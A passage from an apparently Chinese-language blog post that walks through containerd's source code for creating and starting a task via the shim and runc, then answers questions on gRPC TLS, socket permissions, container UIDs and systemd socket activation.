{}) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to load sandbox task %q: %w\u0026#34;, opts.SandboxID, err) } if err := m.shims.Add(ctx, shim); err != nil { return nil, err } return shim, nil } shim, err := m.startShim(ctx, bundle, id, opts) if err != nil { return nil, err } defer func() { if retErr != nil { m.cleanupShim(ctx, shim) } }() if err := m.shims.Add(ctx, shim); err != nil { return nil, fmt.Errorf(\u0026#34;failed to add task: %w\u0026#34;, err) } return shim, nil } 3.1、上面如果SandboxID不为空，调用loadShim函数加载shim，否则调用startShim函数启动shim，这里我们分析startShim。\n源码路径：containerd\\containerd\\core\\runtime\\v2\\shim.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 func (m *ShimManager) startShim(ctx context.Context, bundle *Bundle, id string, opts runtime.CreateOpts) (*shim, error) { ns, err := namespaces.NamespaceRequired(ctx) if err != nil { return nil, err } ctx = log.WithLogger(ctx, log.G(ctx).WithField(\u0026#34;namespace\u0026#34;, ns)) topts := opts.TaskOptions if topts == nil || topts.GetValue() == nil { topts = opts.RuntimeOptions } runtimePath, err := m.resolveRuntimePath(opts.Runtime) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to resolve runtime path: %w\u0026#34;, err) } b := shimBinary(bundle, shimBinaryConfig{ runtime: runtimePath, address: m.containerdAddress, ttrpcAddress: m.containerdTTRPCAddress, env: m.env, }) shim, err := b.Start(ctx, typeurl.MarshalProto(topts), func() { log.G(ctx).WithField(\u0026#34;id\u0026#34;, id).Info(\u0026#34;shim disconnected\u0026#34;) cleanupAfterDeadShim(cleanup.Background(ctx), id, m.shims, m.events, b) // Remove self from the runtime task list. Even though the cleanupAfterDeadShim() // would publish taskExit event, but the shim.Delete() would always failed with ttrpc // disconnect and there is no chance to remove this dead task from runtime task lists. // Thus it\u0026#39;s better to delete it here. m.shims.Delete(ctx, id) }) if err != nil { return nil, fmt.Errorf(\u0026#34;start failed: %w\u0026#34;, err) } return shim, nil } 3.2、newShimTask(shim)调用NewTaskClient\n1 2 3 4 5 6 7 8 9 10 11 12 13 //containerd\\containerd\\core\\runtime\\v2\\shim.go func newShimTask(shim ShimInstance) (*shimTask, error) { _, version := shim.Endpoint() taskClient, err := NewTaskClient(shim.Client(), version) if err != nil { return nil, err } return \u0026amp;shimTask{ ShimInstance: shim, task: taskClient, }, nil } 3.2、NewTaskClient()根据传入的版本号选择不同的通信框架与shim通信，并返回一个shimTask实例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //containerd\\containerd\\core\\runtime\\v2\\bridge.go func NewTaskClient(client interface{}, version int) (TaskServiceClient, error) { switch c := client.(type) { case *ttrpc.Client: switch version { case 2: return \u0026amp;ttrpcV2Bridge{client: v2.NewTaskClient(c)}, nil case 3: return v3.NewTTRPCTaskClient(c), nil default: return nil, fmt.Errorf(\u0026#34;containerd client supports only v2 and v3 TTRPC task client (got %d)\u0026#34;, version) } case grpc.ClientConnInterface: if version != 3 { return nil, fmt.Errorf(\u0026#34;containerd client supports only v3 GRPC task service (got %d)\u0026#34;, version) } return \u0026amp;grpcV3Bridge{v3.NewTaskClient(c)}, nil default: return nil, fmt.Errorf(\u0026#34;unsupported shim client type %T\u0026#34;, c) } } 3.3、shimTask.Create(ctx, opts)创建task\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 func (s *shimTask) Create(ctx context.Context, opts runtime.CreateOpts) (runtime.Task, error) { topts := opts.TaskOptions if topts == nil || topts.GetValue() == nil { topts = opts.RuntimeOptions } request := \u0026amp;task.CreateTaskRequest{ ID: s.ID(), Bundle: s.Bundle(), Stdin: opts.IO.Stdin, Stdout: opts.IO.Stdout, Stderr: opts.IO.Stderr, Terminal: opts.IO.Terminal, Checkpoint: opts.Checkpoint, Options: typeurl.MarshalProto(topts), } for _, m := range opts.Rootfs { request.Rootfs = append(request.Rootfs, \u0026amp;types.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } _, err := s.task.Create(ctx, request) if err != nil { return nil, errdefs.FromGRPC(err) } return s, nil } 3.3、task.Create根据NewTaskClient传入的版本号选择调用不同的RPC（这个NewTaskClient在前面newShimTask函数调用过），这里我们选择分析ttrpctaskClient.Create，这里调用ttRPC接口向shim发出请求。\n1 2 3 4 5 6 7 8 //containerd\\containerd\\api\\runtime\\task\\v3\\shim_ttrpc.pb.go func (c *ttrpctaskClient) Create(ctx context.Context, req *CreateTaskRequest) (*CreateTaskResponse, error) { var resp CreateTaskResponse if err := c.client.Call(ctx, \u0026#34;containerd.task.v3.Task\u0026#34;, \u0026#34;Create\u0026#34;, req, \u0026amp;resp); err != nil { return nil, err } return \u0026amp;resp, nil } 3.3、shim在之前启动后会调用RegisterTTRPC注册服务，所以会接收到containerd发出的TTRPC请求，在这里进行处理。\n源码路径：containerd\\containerd\\cmd\\containerd-shim-runc-v2\\task\\service.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 func (s *service) RegisterTTRPC(server *ttrpc.Server) error { taskAPI.RegisterTTRPCTaskService(server, s) return nil } // Create a new initial process and container with the underlying OCI runtime func (s *service) Create(ctx context.Context, r *taskAPI.CreateTaskRequest) (_ *taskAPI.CreateTaskResponse, err error) { s.mu.Lock() defer s.mu.Unlock() s.lifecycleMu.Lock() handleStarted, cleanup := s.preStart(nil) s.lifecycleMu.Unlock() defer cleanup() container, err := runc.NewContainer(ctx, s.platform, r) if err != nil { return nil, err } s.containers[r.ID] = container s.send(\u0026amp;eventstypes.TaskCreate{ ContainerID: r.ID, Bundle: r.Bundle, Rootfs: r.Rootfs, IO: \u0026amp;eventstypes.TaskIO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: r.Checkpoint, Pid: uint32(container.Pid()), }) // The following line cannot return an error as the only state in which that // could happen would also cause the container.Pid() call above to // nil-deference panic. proc, _ := container.Process(\u0026#34;\u0026#34;) handleStarted(container, proc) return \u0026amp;taskAPI.CreateTaskResponse{ Pid: uint32(container.Pid()), }, nil } 3.3、接着调用runc.NewContainer函数\n源码路径：containerd\\containerd\\cmd\\containerd-shim-runc-v2\\runc\\container.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 // NewContainer returns a new runc container func NewContainer(ctx context.Context, platform stdio.Platform, r *task.CreateTaskRequest) (_ *Container, retErr error) { ns, err := namespaces.NamespaceRequired(ctx) if err != nil { return nil, fmt.Errorf(\u0026#34;create namespace: %w\u0026#34;, err) } opts := \u0026amp;options.Options{} if r.Options.GetValue() != nil { v, err := typeurl.UnmarshalAny(r.Options) if err != nil { return nil, err } if v != nil { opts = v.(*options.Options) } } var pmounts []process.Mount for _, m := range r.Rootfs { pmounts = append(pmounts, process.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } rootfs := \u0026#34;\u0026#34; if len(pmounts) \u0026gt; 0 { rootfs = filepath.Join(r.Bundle, \u0026#34;rootfs\u0026#34;) if err := os.Mkdir(rootfs, 0711); err != nil \u0026amp;\u0026amp; !os.IsExist(err) { return nil, err } } config := \u0026amp;process.CreateConfig{ ID: r.ID, Bundle: r.Bundle, Runtime: opts.BinaryName, Rootfs: pmounts, Terminal: r.Terminal, Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Checkpoint: r.Checkpoint, ParentCheckpoint: r.ParentCheckpoint, Options: r.Options, } if err := WriteOptions(r.Bundle, opts); err != nil { return nil, err } // For historical reason, we write opts.BinaryName as well as the entire opts if err := WriteRuntime(r.Bundle, opts.BinaryName); err != nil { return nil, err } var mounts []mount.Mount for _, pm := range pmounts { mounts = append(mounts, mount.Mount{ Type: pm.Type, Source: pm.Source, Target: pm.Target, Options: pm.Options, }) } defer func() { if retErr != nil { if err := mount.UnmountMounts(mounts, rootfs, 0); err != nil { log.G(ctx).WithError(err).Warn(\u0026#34;failed to cleanup rootfs mount\u0026#34;) } } }() if err := mount.All(mounts, rootfs); err != nil { return nil, fmt.Errorf(\u0026#34;failed to mount rootfs component: %w\u0026#34;, err) } p, err := newInit( ctx, r.Bundle, filepath.Join(r.Bundle, \u0026#34;work\u0026#34;), ns, platform, config, opts, rootfs, ) if err != nil { return nil, errdefs.ToGRPC(err) } if err := p.Create(ctx, config); err != nil { return nil, errdefs.ToGRPC(err) } container := \u0026amp;Container{ ID: r.ID, Bundle: r.Bundle, process: p, processes: make(map[string]process.Process), reservedProcess: make(map[string]struct{}), } pid := p.Pid() if pid \u0026gt; 0 { var cg interface{} if cgroups.Mode() == cgroups.Unified { g, err := cgroupsv2.PidGroupPath(pid) if err != nil { log.G(ctx).WithError(err).Errorf(\u0026#34;loading cgroup2 for %d\u0026#34;, pid) return container, nil } cg, err = cgroupsv2.Load(g) if err != nil { log.G(ctx).WithError(err).Errorf(\u0026#34;loading cgroup2 for %d\u0026#34;, pid) } } else { cg, err = cgroup1.Load(cgroup1.PidPath(pid)) if err != nil { log.G(ctx).WithError(err).Errorf(\u0026#34;loading cgroup for %d\u0026#34;, pid) } } container.cgroup = cg } return container, nil } 3.3、接着调用newInit.Create\n源码路径：containerd\\containerd\\cmd\\containerd-shim-runc-v2\\process\\init.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 // Create the process with the provided config func (p *Init) Create(ctx context.Context, r *CreateConfig) error { var ( err error socket *runc.Socket pio *processIO pidFile = newPidFile(p.Bundle) ) if r.Terminal { //这里创建一个临时的socket文件 if socket, err = runc.NewTempConsoleSocket(); err != nil { return fmt.Errorf(\u0026#34;failed to create OCI runtime console socket: %w\u0026#34;, err) } defer socket.Close() } else { if pio, err = createIO(ctx, p.id, p.IoUID, p.IoGID, p.stdio); err != nil { return fmt.Errorf(\u0026#34;failed to create init process I/O: %w\u0026#34;, err) } p.io = pio } if r.Checkpoint != \u0026#34;\u0026#34; { return p.createCheckpointedState(r, pidFile) } opts := \u0026amp;runc.CreateOpts{ PidFile: pidFile.Path(), NoPivot: p.NoPivotRoot, NoNewKeyring: p.NoNewKeyring, } if p.io != nil { opts.IO = p.io.IO() } if socket != nil { opts.ConsoleSocket = socket } if err := p.runtime.Create(ctx, r.ID, r.Bundle, opts); err != nil { return p.runtimeError(err, \u0026#34;OCI runtime create failed\u0026#34;) } if r.Stdin != \u0026#34;\u0026#34; { if err := p.openStdin(r.Stdin); err != nil { return err } } ctx, cancel := context.WithTimeout(ctx, 30*time.Second) defer cancel() if socket != nil { console, err := socket.ReceiveMaster() if err != nil { return fmt.Errorf(\u0026#34;failed to retrieve console master: %w\u0026#34;, err) } console, err = p.Platform.CopyConsole(ctx, console, p.id, r.Stdin, r.Stdout, r.Stderr, \u0026amp;p.wg) if err != nil { return fmt.Errorf(\u0026#34;failed to start console copy: %w\u0026#34;, err) } p.console = console } else { if err := pio.Copy(ctx, \u0026amp;p.wg); err != nil { return fmt.Errorf(\u0026#34;failed to start io pipe copy: %w\u0026#34;, err) } } pid, err := pidFile.Read() if err != nil { return fmt.Errorf(\u0026#34;failed to retrieve OCI runtime container pid: %w\u0026#34;, err) } p.pid = pid return nil } 3.3、接着调用runtime.Create\n源码路径：containerd\\go-runc\\runc.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 // Create creates a new container and returns its pid if it was created successfully func (r *Runc) Create(context context.Context, id, bundle string, opts *CreateOpts) error { args := []string{\u0026#34;create\u0026#34;, \u0026#34;--bundle\u0026#34;, bundle} if opts == nil { opts = \u0026amp;CreateOpts{} } oargs, err := opts.args() if err != nil { return err } args = append(args, oargs...) cmd := r.command(context, append(args, id)...) if opts.IO != nil { opts.Set(cmd) } cmd.ExtraFiles = opts.ExtraFiles if cmd.Stdout == nil \u0026amp;\u0026amp; cmd.Stderr == nil { data, err := r.cmdOutput(cmd, true, nil) defer putBuf(data) if err != nil { return fmt.Errorf(\u0026#34;%s: %s\u0026#34;, err, data.String()) } return nil } ec, err := r.startCommand(cmd) if err != nil { return err } if opts.IO != nil { if c, ok := opts.IO.(StartCloser); ok { if err := c.CloseAfterStart(); err != nil { return err } } } status, err := Monitor.Wait(cmd, ec) if err == nil \u0026amp;\u0026amp; status != 0 { err = fmt.Errorf(\u0026#34;%s did not terminate successfully: %w\u0026#34;, cmd.Args[0], \u0026amp;ExitError{status}) } return err } 3.3、接着往下调用runc.startCommand\n源码路径：containerd\\go-runc\\monitor.go\n1 2 3 4 5 6 func (r *Runc) startCommand(cmd *exec.Cmd) (chan Exit, error) { if r.PdeathSignal != 0 { return Monitor.StartLocked(cmd) } return Monitor.Start(cmd) } 3.3、再往下调用Monitor.Start\n源码路径：containerd\\containerd\\pkg\\sys\\reaper\\reaper_unix.go\n1 2 3 4 5 6 7 8 9 // Start starts the command and registers the process with the reaper func (m *Monitor) Start(c *exec.Cmd) (chan runc.Exit, error) { ec := m.Subscribe() if err := c.Start(); err != nil { m.Unsubscribe(ec) return nil, err } return ec, nil } 3.3、接着往下调用Cmd.Start，最后调用了一个系统调用os.StartProcess启动进程。\n源码路径：Go\\src\\os\\exec\\exec.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func (c *Cmd) Start() error { // Check for doubled Start calls before we defer failure cleanup. If the prior // call to Start succeeded, we don\u0026#39;t want to spuriously close its pipes. if c.Process != nil { return errors.New(\u0026#34;exec: already started\u0026#34;) } started := false lp := c.Path c.Process, err = os.StartProcess(lp, c.argv(), \u0026amp;os.ProcAttr{ Dir: c.Dir, Files: childFiles, Env: env, Sys: c.SysProcAttr, }) started = true return nil } 3、Start函数调用RPC\ncontainerd/client/process.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // Start starts the exec process func (p *process) Start(ctx context.Context) error { ctx, span := tracing.StartSpan(ctx, \u0026#34;process.Start\u0026#34;, tracing.WithAttribute(\u0026#34;process.id\u0026#34;, p.ID()), tracing.WithAttribute(\u0026#34;process.task.id\u0026#34;, p.task.ID()), ) defer span.End() r, err := p.task.client.TaskService().Start(ctx, \u0026amp;tasks.StartRequest{ ContainerID: p.task.id, ExecID: p.id, }) if err != nil { if p.io != nil { p.io.Cancel() p.io.Wait() p.io.Close() } return errdefs.FromGRPC(err) } span.SetAttributes(tracing.Attribute(\u0026#34;process.pid\u0026#34;, int(r.Pid))) p.pid = r.Pid return nil } 3、RPC请求shim\ncontainerd/api/runtime/task/v3/shim_grpc.pb.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func (c *taskClient) Create(ctx context.Context, in *CreateTaskRequest, opts ...grpc.CallOption) (*CreateTaskResponse, error) { out := new(CreateTaskResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.task.v3.Task/Create\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } func (c *taskClient) Start(ctx context.Context, in *StartRequest, opts ...grpc.CallOption) (*StartResponse, error) { out := new(StartResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.task.v3.Task/Start\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } 3、shim收到请求并调用处理函数\ncontainerd/api/runtime/task/v3/shim_grpc.pb.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 func _Task_Create_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(CreateTaskRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(TaskServer).Create(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.task.v3.Task/Create\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(TaskServer).Create(ctx, req.(*CreateTaskRequest)) } return interceptor(ctx, in, info, handler) } func _Task_Start_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(StartRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(TaskServer).Start(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.task.v3.Task/Start\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(TaskServer).Start(ctx, req.(*StartRequest)) } return interceptor(ctx, in, info, handler) } 3、实际调用的处理函数\ncontainerd/cmd/containerd-shim-runc-v2/task/service.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 func (s *service) RegisterTTRPC(server *ttrpc.Server) error { taskAPI.RegisterTTRPCTaskService(server, s) return nil } // Create a new initial process and container with the underlying OCI runtime func (s *service) Create(ctx context.Context, r *taskAPI.CreateTaskRequest) (_ *taskAPI.CreateTaskResponse, err error) { s.mu.Lock() defer s.mu.Unlock() s.lifecycleMu.Lock() handleStarted, cleanup := s.preStart(nil) s.lifecycleMu.Unlock() defer cleanup() container, err := runc.NewContainer(ctx, s.platform, r) if err != nil { return nil, err } s.containers[r.ID] = container s.send(\u0026amp;eventstypes.TaskCreate{ ContainerID: r.ID, Bundle: r.Bundle, Rootfs: r.Rootfs, IO: \u0026amp;eventstypes.TaskIO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: r.Checkpoint, Pid: uint32(container.Pid()), }) // The following line cannot return an error as the only state in which that // could happen would also cause the container.Pid() call above to // nil-deference panic. proc, _ := container.Process(\u0026#34;\u0026#34;) handleStarted(container, proc) return \u0026amp;taskAPI.CreateTaskResponse{ Pid: uint32(container.Pid()), }, nil } // Start a process func (s *service) Start(ctx context.Context, r *taskAPI.StartRequest) (*taskAPI.StartResponse, error) { container, err := s.getContainer(r.ID) if err != nil { return nil, err } var cinit *runc.Container s.lifecycleMu.Lock() if r.ExecID == \u0026#34;\u0026#34; { cinit = container } else { if _, initExited := s.containerInitExit[container]; initExited { s.lifecycleMu.Unlock() return nil, errdefs.ToGRPCf(errdefs.ErrFailedPrecondition, \u0026#34;container %s init process is not running\u0026#34;, container.ID) } s.runningExecs[container]++ } handleStarted, cleanup := s.preStart(cinit) s.lifecycleMu.Unlock() defer cleanup() p, err := container.Start(ctx, r) if err != nil { // If we failed to even start the process, s.runningExecs // won\u0026#39;t get decremented in s.handleProcessExit. We still need // to update it. if r.ExecID != \u0026#34;\u0026#34; { s.lifecycleMu.Lock() s.runningExecs[container]-- if ch, ok := s.execCountSubscribers[container]; ok { ch \u0026lt;- s.runningExecs[container] } s.lifecycleMu.Unlock() } handleStarted(container, p) return nil, errdefs.ToGRPC(err) } switch r.ExecID { case \u0026#34;\u0026#34;: switch cg := container.Cgroup().(type) { case cgroup1.Cgroup: if err := s.ep.Add(container.ID, cg); err != nil { log.G(ctx).WithError(err).Error(\u0026#34;add cg to OOM monitor\u0026#34;) } case *cgroupsv2.Manager: allControllers, err := cg.RootControllers() if err != nil { log.G(ctx).WithError(err).Error(\u0026#34;failed to get root controllers\u0026#34;) } else { if err := cg.ToggleControllers(allControllers, cgroupsv2.Enable); err != nil { if userns.RunningInUserNS() { log.G(ctx).WithError(err).Debugf(\u0026#34;failed to enable controllers (%v)\u0026#34;, allControllers) } else { log.G(ctx).WithError(err).Errorf(\u0026#34;failed to enable controllers (%v)\u0026#34;, allControllers) } } } if err := s.ep.Add(container.ID, cg); err != nil { log.G(ctx).WithError(err).Error(\u0026#34;add cg to OOM monitor\u0026#34;) } } s.send(\u0026amp;eventstypes.TaskStart{ ContainerID: container.ID, Pid: uint32(p.Pid()), }) default: s.send(\u0026amp;eventstypes.TaskExecStarted{ ContainerID: container.ID, ExecID: r.ExecID, Pid: uint32(p.Pid()), }) } handleStarted(container, p) return \u0026amp;taskAPI.StartResponse{ Pid: uint32(p.Pid()), }, nil } 问题与解答 1、containerd的 gRPC 目前启用加解密保护通信与否？是否有双向认证？\n答：在 containerd 中，gRPC 的加密是通过配置文件中的 TLS 设置实现的。你可以在 containerd 的配置文件 /etc/containerd/config.toml 中配置 TLS 相关的选项。\n在 config.toml 文件中，你可以为 gRPC 服务启用 TLS：\n1 2 3 4 5 6 7 8 9 [grpc] address = \u0026#34;/run/containerd/containerd.sock\u0026#34; # 开启TCP监听，默认是关闭的 tcp_address = \u0026#34;0.0.0.0:2375\u0026#34; # 配置TLS证书和密钥 tls_cert = \u0026#34;/etc/containerd/tls/containerd.crt\u0026#34; tls_key = \u0026#34;/etc/containerd/tls/containerd.key\u0026#34; # 可选的，CA证书路径 tls_ca = \u0026#34;/etc/containerd/tls/ca.crt\u0026#34; tls_cert 和 tls_key 是服务器的证书和私钥文件，containerd 将使用这些文件来加密 gRPC 通信。\ntls_ca 是可选的 CA 证书，用于验证客户端证书，从而支持双向认证（Mutual TLS, mTLS）。\n2、2.1.4中提到“插件通过 gRPC 提供服务接口，containerd 核心通过调用这些接口来管理镜像、快照和容器运行时等”。 是否意味着containerd与插件之间也是使用gRPC进行的通信？也就是containerd内部也有gRPC通信？\n答：containerd内部应该不是gRPC通信，gRPC是一个RPC通信框架，一般用于进程间，在一个进程中使用gRPC没有太大的必要，一个进程内部各模块的通信应该是通过接口和直接的函数调用来实现内部通信的。\n3、2.1.4 以及 3.1 分别提到：“守护进程与外部客户端（如 ctr 工具或 Docker 引擎）之间的通信 ”使用 gRPC/UDS ？ 特别是 3.1 如何理解？3.1 后面提到一个例子，Docker引擎通过 gRPC 连接到守护进程的UDS地址，以请求管理容器、镜像、快照等操作。问：gRPC 如何连接的这个 UDS 地址（技术原理）？\n答：这个问题理解的关键点在于uds是如何与gRPC结合使用的，containerd在服务启动的时候使用 sys.GetLocalListener 来监听一个 Unix Domain Socket。然后将监听器传递给 serve函数处理grpc请求。（具体的代码可以在4.1中找到）\n4、创建的容器的所属 user、group 默认是与containerd 同组同用户吗？\n答：我在这个问题上做了一些实验来验证。首先，创建的容器的用户和用户组肯定是可以设置的，无论是在镜像中指定，还是在创建容器的时候指定；但默认不指定的情况下镜像一般都是将容器内的进程设置为以root用户进行。这也印证了下面这句话：在 containerd 中，创建的容器默认情况下不会自动继承 containerd 进程的用户（user）和组（group）。相反，容器的用户和组是根据容器的配置（如 OCI 规范）来决定的。\n下面是我使用containerd创建alpine服务容器的权限的配置文件：\n5、3.3 提到“插件可能作为外部服务运行，需要通过 UDS 与 containerd 通信。”，例子介绍中说：“外部存储插件可能独立运行并通过 UDS 暴露其 gRPC 服务，containerd 通过连接这个 UDS 来调用插件的服务。” 问：containerd 通过 UDS 连接外部插件，外部插件暴露的 gRPC 给谁？\n答：这是containerd官方文档查到的，containerd通过gRPC连接外部插件，那外部插件暴露的gRPC肯定是给containerd的配置文件。\n6、systemd 提供使用socket activationt机制，是针对内核态进程还是用户态进程，亦或是两者都支持？\n答：针对用户态进程。\n7、containerd的socket文件的mode和uid、gid分别是？由谁设置该内容？\n答：具体回答可以看问题9，至于socket文件的mode、uid、gid的设置肯定是由containerd自己设置，具体可看源码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 //首先传入config.toml中设置的gid，uid [ttrpc] address = \u0026#34;\u0026#34; gid = 0 uid = 0 //接着调用GetLocalListener tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) //再创建socket文件，之后调用chmod为0660，chown为上面传入的gid、uid func GetLocalListener(path string, uid, gid int) (net.Listener, error) { // Ensure parent directory is created if err := mkdirAs(filepath.Dir(path), uid, gid); err != nil { return nil, err } l, err := CreateUnixSocket(path) if err != nil { return l, err } if err := os.Chmod(path, 0660); err != nil { l.Close() return nil, err } if err := os.Chown(path, uid, gid); err != nil { l.Close() return nil, err } return l, nil } 8、root权限下：containerd、shim以及容器的UID、GID是否都一样？如何设置容器不同的UID、GID\n答：root权限下containerd、shim的UID、GID都是root\n1 2 3 4 hacker@LAPTOP-V47UU71B:/mnt/c/Users/L$ ps -eo pid,user,group,comm | grep containerd 248 root root containerd 8561 root root containerd-shim 13295 root root containerd-shim 如何设置容器不同的uid、gid，可以在containerd创建容器时指定用户及用户组，比如我的用户和用户组都是1000，我可以这么创建容器。\n1 2 hacker@LAPTOP-V47UU71B:/mnt/c/Users/L$ sudo ctr container create -u 1000:1000 m.daocloud.io/docker.io/library/alpine:latest mycont ainer 进入容器后查看id\n1 2 3 hacker@LAPTOP-V47UU71B:/mnt/c/Users/L$ sudo ctr task exec -t --exec-id exec-1 mycontainer /bin/sh ~ $ id uid=1000 gid=1000 groups=1000 9、如果用systemd启动containerd守护进程以及用于与containerd通信的client进程，那么socket文件是由systemd创建还是containerd创建？\n如果使用 systemd 来启动 containerd 守护进程以及用于与 containerd 通信的客户端进程，并且启用了 socket activation 机制（可以不启动），那么 socket 文件将由 systemd 创建，而不是 containerd。\n（事实上containerd应该是不支持systemd的socket activation机制的，github也有人提出过在containerd中加入此机制：add socket activation · Issue #164 · containerd/containerd (github.com)）\n一般如果支持socket activation机制的话会有类似下图的逻辑，服务器会先调用sd_listen_fds函数，看systemd是否创建了socket文件，如果创建了就不会再创建了。所以如果使用system的socket activation启动进程，那么就一定是systemd创建socket文件。\n具体过程如下：\nsystemd 创建 socket：在 socket activation 机制下，systemd 会首先根据配置创建一个监听 socket 文件，并将其置于监听状态。这是在 containerd 守护进程启动之前完成的。 systemd 启动 containerd：当有客户端连接到由 systemd 创建的 socket 时，systemd 检测到连接请求并启动 containerd 守护进程，并将这个 socket 传递给 containerd。 containerd 使用 socket：containerd 启动后，接收 systemd 传递的 socket，并使用该 socket 来处理客户端的通信请求。 为了更好的理解为什么是systemd创建我们写一个使用 systemd 启动 containerd 守护进程和客户端进程的流程：\n1、创建 systemd 的 socket 单元文件\n你需要为 containerd 创建一个 .socket 单元文件，通常放在 /etc/systemd/system/containerd.socket 或 /usr/lib/systemd/system/containerd.socket。\n示例如下：\n1 2 3 4 5 6 7 8 9 [Unit] Description=containerd Socket [Socket] ListenStream=/run/containerd/containerd.sock SocketMode=0660 [Install] WantedBy=sockets.target 2、创建 systemd 的 service 单元文件\n你需要确保 containerd 的 .service 单元文件正确配置。如果默认的 service 文件不支持 socket activation，你可能需要提供一个自定义的 service 文件。放在 /etc/systemd/system/containerd.service 或 /usr/lib/systemd/system/containerd.service。\n示例如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 [Unit] Description=containerd container runtime Documentation=https://containerd.io Wants=network-online.target After=network-online.target [Service] ExecStart=/usr/bin/containerd Type=notify Restart=always LimitNOFILE=1048576 LimitNPROC=infinity LimitCORE=infinity TasksMax=infinity Delegate=yes KillMode=process OOMScoreAdjust=-999 ExecStartPre=-/sbin/modprobe overlay ExecReload=/bin/kill -s HUP $MAINPID KillSignal=SIGTERM TimeoutStartSec=0 [Install] WantedBy=multi-user.target 3、启用并启动 socket 和 service\n启用并启动 socket 和 service：\n1 2 sudo systemctl enable containerd.socket sudo systemctl start containerd.socket 此时，systemd 会监听 /run/containerd/containerd.sock，并在有客户端连接时自动启动 containerd 服务。\n10、OCI 标准是什么？\nOCI（Open Container Initiative） 是一个开源项目，旨在定义容器运行时和镜像的标准。它由 Linux Foundation 组织主导，主要包括两个关键规范：\nOCI Runtime Specification（OCI 运行时规范）： 这个规范定义了容器的运行时行为，包括如何创建、配置、启动、停止和删除容器。它定义了容器生命周期的各个阶段，以及容器进程的环境、命名空间、cgroups 等配置。 OCI Image Specification（OCI 镜像规范）： 这个规范定义了容器镜像的格式及其内容。这包括如何打包应用程序及其依赖项，以便镜像可以被各种容器运行时拉取和解压，以一致的方式运行。 11、为什么containerd最终调用的是net.listen()创建socket文件？\n因为net.listen()调用的是Go标准库net包中的一个函数，Go对底层uds的syscall做了一个封装，实际创建socket文件还是bind阶段，具体可以查看net的实现，我稍微看了一下源码确实是做了封装。\n参考资料 